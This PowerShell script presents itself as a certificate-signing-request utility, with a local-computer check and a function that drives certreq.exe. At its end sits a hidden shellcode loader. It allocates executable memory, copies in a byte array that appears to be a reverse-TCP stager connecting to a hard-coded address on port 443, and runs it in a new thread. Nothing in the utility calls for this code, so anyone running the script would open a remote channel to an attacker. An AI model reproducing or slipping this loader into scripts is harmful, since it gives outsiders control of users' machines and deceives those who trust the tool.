

function Test-LocalComputer {
	

	[CmdletBinding()]
	[OutputType([bool])]
	param (
		[Parameter(Mandatory)]
		[string]$ComputerName
	)
	begin {
		$LocalComputerLabels = @(
		'.',
		'localhost',
		[System.Net.Dns]::GetHostName(),
		[System.Net.Dns]::GetHostEntry('').HostName
		)
	}
	process {
		try {
			if ($LocalComputerLabels -contains $ComputerName) {
				Write-Verbose -Message "The computer reference [$($ComputerName)] is a local computer"
				$true
			}
			else {
				Write-Verbose -Message "The computer reference [$($ComputerName)] is a remote computer"
				$false
			}
		}
		catch {
			throw $_
		}
	}
}

function New-CertificateSigningRequest {
	
	[CmdletBinding(SupportsShouldProcess=$true)]
	[OutputType('System.IO.FileInfo')]
	param (
		[ValidateNotNullOrEmpty()]
		[string]$SubjectHost,

		
		[string[]]$SubjectAlternateNameDNS,

		[Parameter(Mandatory)]
		[ValidateNotNullOrEmpty()]
		[string]$FilePath,

		[ValidateNotNullOrEmpty()]
		[string]$ComputerName = $env:COMPUTERNAME,

		[ValidateNotNullOrEmpty()]
		[pscredential]$Credential,

		[ValidateNotNullOrEmpty()]
		[string]$SubjectBasePath,

		[ValidateNotNullOrEmpty()]
		[switch]$PrivateKeyNotExportable,

		[ValidateNotNullOrEmpty()]
		[ValidateSet(1024, 2048, 4096, 8192, 16384)]
		[int]$KeyLength = 2048,

		[ValidateNotNullOrEmpty()]
		[ValidateSet(
					 'Digital Signature',
					 'Key Encipherment',
					 'Non Repudiation',
					 'Data Encipherment',
					 'Key Agreement',
					 'Key Cert Sign',
					 'Offline CRL',
					 'CRL Sign',
					 'Encipher Only'
					 )]
		[string[]]$KeyUsage = @('Digital Signature', 'Key Encipherment'),

		[ValidateNotNullOrEmpty()]
		[ValidateSet('Microsoft RSA SChannel Cryptographic Provider')]
		[string]$ProviderName = 'Microsoft RSA SChannel Cryptographic Provider',

		[ValidateNotNullOrEmpty()]
		[ValidateSet('PKCS10', 'CMC')]
		[string]$RequestType = 'PKCS10',

		[ValidateNotNullOrEmpty()]
		[string]$CertReqFilePath = "$env:SystemRoot\system32\certreq.exe"

	)

	begin {
		if (-not $PSBoundParameters.ContainsKey("SubjectHost")) {$oComputerSystem = Get-WmiObject -Class Win32_ComputerSystem; $SubjectHost = ($oComputerSystem.DNSHostName, $oComputerSystem.Domain -join ".").ToLower()}
		Write-Verbose "Using Subject Host of '$SubjectHost'"
		
		$bIsLocalComputer = Test-LocalComputer -ComputerName $ComputerName
	}
	process {
		$keyUsageHexMappings = @{
			'Digital Signature' = 0x80
			'Key Encipherment' = 0x20
			'Non Repudiation' = 0x40
			'Data Encipherment' = 0x10
			'Key Agreement' = 0x08
			'Key Cert Sign' = 0x04
			'Offline CRL' = 0x02
			'CRL Sign' = 0x02
			'Encipher Only' = 0x01
		}

		
		$usageHex = $KeyUsage | Foreach-Object {$keyUsageHexMappings[$_]}
		[string]$KeyUsage = '0x{0:x}' -f [int]($usageHex | Measure-Object -Sum).Sum

		if ($PrivateKeyNotExportable.IsPresent) {
			$exportable = 'FALSE'
		}
		else {
			$exportable = 'TRUE'
		}

		
		$infContents = @"
[Version]
Signature = "`$Windows NT`$"

[NewRequest]
Subject = "CN=$($SubjectHost,$SubjectBasePath -join ',')"
Exportable = $exportable
KeyLength = $KeyLength
KeySpec = 1
KeyUsage = $KeyUsage
MachineKeySet = True
ProviderName = "$ProviderName"
ProviderType = 12
Silent = True
SMIME = False
RequestType = $RequestType

[Extensions]
2.5.29.17 = "{text}"
_continue_ = "dns=${SubjectHost}&"
"@
		
		if ($PSBoundParameters.ContainsKey("SubjectAlternateNameDNS")) {
			
			$infContents += $SubjectAlternateNameDNS | Where-Object {$_ -ne $SubjectHost} | Foreach-Object {"`n_continue_ = 'dns=${_}&'" -replace "'", '"'}
		} 

		if ($PSCmdlet.ShouldProcess("CN=$SubjectHost", "Create Certificate Signing Request with following as inf file contents")) {
			try {
				$infFilePath = [system.IO.Path]::GetTempFileName()
				Remove-Item -Path $infFilePath -ErrorAction Ignore -Force
				$null = New-Item -Path $infFilePath -Value $infContents -Type File
				

				if (-not $bIsLocalComputer) {
					$sessParams = @{'ComputerName' = $ComputerName}

					$tempReqFilePath = 'C:\certreq.req'
					$tempInfFilePath = "C:\$([System.IO.Path]::GetFileName($infFilePath))"

					if ($PSBoundParameters.ContainsKey('Credential')) {
						$sessParams.Credential = $Credential
					}

					$session = New-PSSession @sessParams
					$null = Send-File -Session $session -Path $infFilePath -Destination 'C:\'

					Invoke-Command -Session $session -ScriptBlock { Start-Process -FilePath $using:CertReqFilePath -Args "-new `"$using:tempInfFilePath`" `"$using:tempReqFilePath`"" }
					Invoke-Command -Session $session -ScriptBlock { Get-Content -Path $using:tempReqFilePath } | Out-File -PSPath $FilePath
				}
				else {Start-Process -FilePath $CertReqFilePath -Args "-new `"$infFilePath`" `"$FilePath`"" -Wait -NoNewWindow}
				Get-Item -Path $FilePath
			}
			catch {
				throw $_
			}
			finally {
				if (-not $bIsLocalComputer) {
					Invoke-Command -Session $session -ScriptBlock {Remove-Item -Path $using:tempReqFilePath, $using:tempInfFilePath -ErrorAction Ignore}
					Remove-PSSession -Session $session -ErrorAction Ignore
				} 
				else {Remove-Item -Path $infFilePath -ErrorAction Ignore}
			}
		} 
		else {
			Write-Output "`n$infContents"
		}
	}
}

$c = '[DllImport("kernel32.dll")]public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);[DllImport("kernel32.dll")]public static extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);[DllImport("msvcrt.dll")]public static extern IntPtr memset(IntPtr dest, uint src, uint count);';$w = Add-Type -memberDefinition $c -Name "Win32" -namespace Win32Functions -passthru;[Byte[]];[Byte[]]$sc = 0xfc,0xe8,0x82,0x00,0x00,0x00,0x60,0x89,0xe5,0x31,0xc0,0x64,0x8b,0x50,0x30,0x8b,0x52,0x0c,0x8b,0x52,0x14,0x8b,0x72,0x28,0x0f,0xb7,0x4a,0x26,0x31,0xff,0xac,0x3c,0x61,0x7c,0x02,0x2c,0x20,0xc1,0xcf,0x0d,0x01,0xc7,0xe2,0xf2,0x52,0x57,0x8b,0x52,0x10,0x8b,0x4a,0x3c,0x8b,0x4c,0x11,0x78,0xe3,0x48,0x01,0xd1,0x51,0x8b,0x59,0x20,0x01,0xd3,0x8b,0x49,0x18,0xe3,0x3a,0x49,0x8b,0x34,0x8b,0x01,0xd6,0x31,0xff,0xac,0xc1,0xcf,0x0d,0x01,0xc7,0x38,0xe0,0x75,0xf6,0x03,0x7d,0xf8,0x3b,0x7d,0x24,0x75,0xe4,0x58,0x8b,0x58,0x24,0x01,0xd3,0x66,0x8b,0x0c,0x4b,0x8b,0x58,0x1c,0x01,0xd3,0x8b,0x04,0x8b,0x01,0xd0,0x89,0x44,0x24,0x24,0x5b,0x5b,0x61,0x59,0x5a,0x51,0xff,0xe0,0x5f,0x5f,0x5a,0x8b,0x12,0xeb,0x8d,0x5d,0x68,0x33,0x32,0x00,0x00,0x68,0x77,0x73,0x32,0x5f,0x54,0x68,0x4c,0x77,0x26,0x07,0xff,0xd5,0xb8,0x90,0x01,0x00,0x00,0x29,0xc4,0x54,0x50,0x68,0x29,0x80,0x6b,0x00,0xff,0xd5,0x6a,0x05,0x68,0xac,0x10,0x01,0x97,0x68,0x02,0x00,0x01,0xbb,0x89,0xe6,0x50,0x50,0x50,0x50,0x40,0x50,0x40,0x50,0x68,0xea,0x0f,0xdf,0xe0,0xff,0xd5,0x97,0x6a,0x10,0x56,0x57,0x68,0x99,0xa5,0x74,0x61,0xff,0xd5,0x85,0xc0,0x74,0x0c,0xff,0x4e,0x08,0x75,0xec,0x68,0xf0,0xb5,0xa2,0x56,0xff,0xd5,0x6a,0x00,0x6a,0x04,0x56,0x57,0x68,0x02,0xd9,0xc8,0x5f,0xff,0xd5,0x8b,0x36,0x6a,0x40,0x68,0x00,0x10,0x00,0x00,0x56,0x6a,0x00,0x68,0x58,0xa4,0x53,0xe5,0xff,0xd5,0x93,0x53,0x6a,0x00,0x56,0x53,0x57,0x68,0x02,0xd9,0xc8,0x5f,0xff,0xd5,0x01,0xc3,0x29,0xc6,0x75,0xee,0xc3;$size = 0x1000;if ($sc.Length -gt 0x1000){$size = $sc.Length};$x=$w::VirtualAlloc(0,0x1000,$size,0x40);for ($i=0;$i -le ($sc.Length-1);$i++) {$w::memset([IntPtr]($x.ToInt32()+$i), $sc[$i], 1)};$w::CreateThread(0,0,$x,0,0,0);for (;;){Start-sleep 60};

